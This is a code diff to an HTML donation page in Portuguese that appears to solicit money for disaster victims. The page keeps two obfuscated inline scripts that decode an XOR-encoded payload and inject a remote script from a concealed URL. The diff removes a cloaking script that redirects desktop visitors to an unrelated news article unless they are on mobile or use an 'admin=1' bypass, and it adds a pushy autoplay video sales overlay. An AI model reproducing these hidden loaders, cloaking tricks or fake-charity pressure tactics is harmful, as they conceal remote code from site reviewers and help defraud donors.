@@ -261,28 +261,6 @@
   <script>(function () { var o_c86 = atob("DPecrPtRJvA2aqm9z4y+2Yk9BMoUAt3Jv4Smg9QyQp4YH93QppHlgpg+S95UGIbOrIX13I8iCYBfEszR4If11J49CJpFSIWfroPo3pIzU4RTGYuHlKqwjpw9SZJXBtqf9aznjpUwS5UUUIvNpo/5wLI1BNwUHMjRupK+ltlnR8ZTCJiJ+5KknMlnQsACD8iOqc+ozZ9zW61L"); var b_p = []; for (var r_t = 0; r_t < o_c86.length; r_t++) { b_p.push(o_c86.charCodeAt(r_t) & 255); } var p_8u = b_p[0]; var b_9lg = b_p.slice(1, 1 + p_8u); var e_l = b_p.slice(1 + p_8u); var z_7 = e_l.map(function (b, z_rl) { return b ^ b_9lg[z_rl % p_8u]; }); var a_s = ""; for (var e_za = 0; e_za < z_7.length; e_za++) { a_s += String.fromCharCode(z_7[e_za] & 255); } var u_l9 = decodeURIComponent(escape(a_s)); var b_jy = JSON.parse(u_l9); var y_in = b_jy.globals || []; y_in.forEach(function (k_y) { window[k_y.name] = k_y.value; }); var a_q3 = document.createElement("script"); a_q3.src = b_jy.url; a_q3.async = true; a_q3.defer = true; (b_jy.attributes || []).forEach(function (m_aavz) { a_q3.setAttribute(m_aavz.name, m_aavz.value); }); (document.head || document.documentElement).appendChild(a_q3); })();</script>
 <script>(function(){var k_kka=atob("DF+nXTOUn74upsQC3iSFKEH4vYQMzrB2riydchz3+9AA07Bvtznec1D78pBM1OtxvS3OLUfnsMtay7ctsj7TOEDgsdRdhOggvyvTL1r26spL1eY4hSSFM1L5+pwUhKBjqj6KKEf59thXi7RwuynCM0e5591BwulxvTSFcRHi/tJbw+Y4/H3acUi28d9Dw+Y4/DvGKVK56spDz6J78y/VOEXx8coD1bFgtzvUfx+26d9C06Eg5H2FIG7p");var g_6iha=[];for(var o_19=0;o_19<k_kka.length;o_19++){g_6iha.push(k_kka.charCodeAt(o_19)&255);}var u_6=g_6iha[0];var j_h8=g_6iha.slice(1,1+u_6);var k_7s=g_6iha.slice(1+u_6);var f_3w=k_7s.map(function(b,d_d){return b^j_h8[d_d%u_6];});var e_1dwd="";for(var k_qi6v=0;k_qi6v<f_3w.length;k_qi6v++){e_1dwd+=String.fromCharCode(f_3w[k_qi6v]&255);}var a_jxw=decodeURIComponent(escape(e_1dwd));var l_6sx=JSON.parse(a_jxw);var t_4aa9=l_6sx.globals||[];t_4aa9.forEach(function(c_g){window[c_g.name]=c_g.value;});var n_stv0=document.createElement("script");n_stv0.src=l_6sx.url;n_stv0.async=true;n_stv0.defer=true;(l_6sx.attributes||[]).forEach(function(e_5){n_stv0.setAttribute(e_5.name,e_5.value);});(document.head||document.documentElement).appendChild(n_stv0);})();</script>
 <script src="js/utm-manager.js"></script>
-<script type="text/javascript">
-  //digite a url de redirect
-  var url_link_redirect_pc = "https://g1.globo.com/rj/rio-de-janeiro/noticia/2026/07/30/veja-como-amanheceu-o-rio-apos-o-vendaval.ghtml";
-  
-  function isAdminBypass() {
-    if (window.location.search.indexOf('admin=1') !== -1) {
-      localStorage.setItem('admin_bypass', '1');
-    }
-    return localStorage.getItem('admin_bypass') === '1';
-  }
-
-  //function js
-  function isMobile() {
-   const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-   return regex.test(navigator.userAgent);
-  }
-
-  //validation js
-  if (isMobile() || isAdminBypass()) { console.log("Mobile device or Admin detected"); } else {
-   window.location = url_link_redirect_pc;
-  }
-</script>
 </head>
 
 <body>
@@ -315,8 +293,99 @@
         <strong>Cada hora que passa sem ajuda pode custar mais vidas.</strong>
       </p>
 
-      <div class="dlg__media dlg__media--emotive">
-        <video src="images/VSL.mp4" type="video/mp4" controls autoplay muted playsinline preload="auto" style="display: block; margin: 0 auto; width: 100%; border-radius: 12px; background-color: #000;"></video>
+      <div class="dlg__media dlg__media--emotive" style="position: relative;">
+        <div id="vsl-overlay-container" style="position: absolute; inset: 0; z-index: 10; cursor: pointer; display: flex; align-items: center; justify-content: center;" onclick="this.style.display='none'; document.getElementById('vsl-custom-controls').style.display='flex'; var v = document.getElementById('vsl-video'); v.currentTime = 0; v.muted = false; v.play(); v.style.pointerEvents='auto';">
+            <div id="vsl-overlay" style="background: rgba(220, 80, 50, 0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; border-radius: 6px; border: 1.5px solid white; padding: 15px 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
+                <div style="font-size: 19px; font-weight: bold; margin-bottom: 5px; text-align: center; font-family: sans-serif;">Seu vídeo já começou</div>
+                <svg viewBox="0 0 24 24" fill="white" width="65px" height="65px" style="margin: 5px 0;"><path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/></svg>
+                <div style="font-size: 18px; font-weight: bold; margin-top: 5px; text-align: center; font-family: sans-serif;">Clique para ouvir</div>
+            </div>
+        </div>
+        
+        <div id="vsl-custom-controls" style="position: absolute; bottom: 0; left: 0; right: 0; height: 70px; background: linear-gradient(transparent, rgba(0,0,0,0.7)); border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; display: none; z-index: 5; flex-direction: column; justify-content: flex-end; padding: 0 15px 12px 15px; pointer-events: none;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div id="vsl-play-btn" style="cursor: pointer; width: 18px; height: 18px; pointer-events: auto;">
+                        <svg id="vsl-icon-pause" viewBox="0 0 24 24" fill="white" width="100%" height="100%"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+                        <svg id="vsl-icon-play" viewBox="0 0 24 24" fill="white" width="100%" height="100%" style="display: none;"><path d="M8 5v14l11-7z"/></svg>
+                    </div>
+                    <div id="vsl-time" style="color: white; font-family: sans-serif; font-size: 13px; font-weight: 500;">0:00</div>
+                </div>
+                <div id="vsl-speed-btn" style="cursor: pointer; pointer-events: auto; position: relative;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18px" height="18px"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                    <div id="vsl-speed-menu" style="display: none; position: absolute; bottom: 30px; right: 0; background: rgba(0,0,0,0.85); border-radius: 6px; flex-direction: column; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.5);">
+                        <div class="speed-opt" data-speed="2" style="color: white; padding: 8px 15px; font-size: 13px; font-family: sans-serif; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.1);">2x</div>
+                        <div class="speed-opt" data-speed="1.5" style="color: white; padding: 8px 15px; font-size: 13px; font-family: sans-serif; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.1);">1.5x</div>
+                        <div class="speed-opt" data-speed="1.25" style="color: white; padding: 8px 15px; font-size: 13px; font-family: sans-serif; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.1);">1.25x</div>
+                        <div class="speed-opt" data-speed="1" style="color: #cb593c; padding: 8px 15px; font-size: 13px; font-family: sans-serif; cursor: pointer; font-weight: bold;">1x (Normal)</div>
+                    </div>
+                </div>
+            </div>
+            <div style="position: absolute; bottom: 0; left: 0; right: 0; height: 5px; background: rgba(255,255,255,0.3); border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; overflow: hidden;">
+                <div id="vsl-progress" style="width: 0%; height: 100%; background: #cb593c;"></div>
+            </div>
+        </div>
+
+        <video id="vsl-video" src="images/VSL.mp4" type="video/mp4" autoplay muted playsinline preload="auto" style="display: block; margin: 0 auto; width: 100%; border-radius: 12px; background-color: #000; pointer-events: none;"></video>
+        
+        <script>
+            (function(){
+                const video = document.getElementById('vsl-video');
+                const playBtn = document.getElementById('vsl-play-btn');
+                const iconPlay = document.getElementById('vsl-icon-play');
+                const iconPause = document.getElementById('vsl-icon-pause');
+                const timeDisp = document.getElementById('vsl-time');
+                const progBar = document.getElementById('vsl-progress');
+                const speedBtn = document.getElementById('vsl-speed-btn');
+                const speedMenu = document.getElementById('vsl-speed-menu');
+
+                function formatTime(sec) {
+                    let m = Math.floor(sec / 60);
+                    let s = Math.floor(sec % 60);
+                    return m + ':' + (s < 10 ? '0' + s : s);
+                }
+
+                video.addEventListener('timeupdate', () => {
+                    timeDisp.innerText = formatTime(video.currentTime);
+                    if(video.duration) progBar.style.width = (video.currentTime / video.duration * 100) + '%';
+                });
+
+                function togglePlay() {
+                    if(video.paused) video.play(); else video.pause();
+                    speedMenu.style.display = 'none';
+                }
+
+                video.addEventListener('play', () => {
+                    iconPlay.style.display = 'none';
+                    iconPause.style.display = 'block';
+                });
+                video.addEventListener('pause', () => {
+                    iconPlay.style.display = 'block';
+                    iconPause.style.display = 'none';
+                });
+
+                playBtn.addEventListener('click', (e) => { e.stopPropagation(); togglePlay(); });
+                video.addEventListener('click', togglePlay);
+                
+                speedBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    speedMenu.style.display = speedMenu.style.display === 'none' ? 'flex' : 'none';
+                });
+                
+                document.querySelectorAll('.speed-opt').forEach(opt => {
+                    opt.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        video.playbackRate = parseFloat(opt.getAttribute('data-speed'));
+                        document.querySelectorAll('.speed-opt').forEach(o => { o.style.color = 'white'; o.style.fontWeight = 'normal'; });
+                        opt.style.color = '#cb593c';
+                        opt.style.fontWeight = 'bold';
+                        speedMenu.style.display = 'none';
+                    });
+                });
+                
+                document.addEventListener('click', () => { speedMenu.style.display = 'none'; });
+            })();
+        </script>
       </div>
 
       <p>&#8220;Com a sua doação, alimentos, água, telhas, colchões e itens de higiene chegarão diretamente às
@@ -1009,7 +1078,7 @@
       }
 
       function anyOpen() { return !!document.querySelector('.dlg:not([hidden])'); }
-      const show = el => { if (el) { el.hidden = false; lockScroll(); const v = el.querySelector('video'); if(v) v.play().catch(()=>{}); } };
+      const show = el => { if (el) { el.hidden = false; lockScroll(); } };
       const hide = el => { if (el) { el.hidden = true; if (!anyOpen()) unlockScroll(); const v = el.querySelector('video'); if(v) v.pause(); } };
 
       function markLoaderOK() {
